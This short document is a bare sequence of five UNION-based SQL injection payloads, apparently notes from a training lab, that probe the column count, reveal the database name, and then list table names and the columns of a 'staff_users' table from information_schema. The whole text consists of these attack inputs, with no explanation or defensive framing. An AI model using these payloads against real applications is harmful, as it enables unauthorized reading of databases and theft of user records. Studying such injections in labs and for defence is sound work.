`1 UNION SELECT 1,2,3`

`0 UNION SELECT 1,2,3`

`0 UNION SELECT 1,2,database()`

`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`








































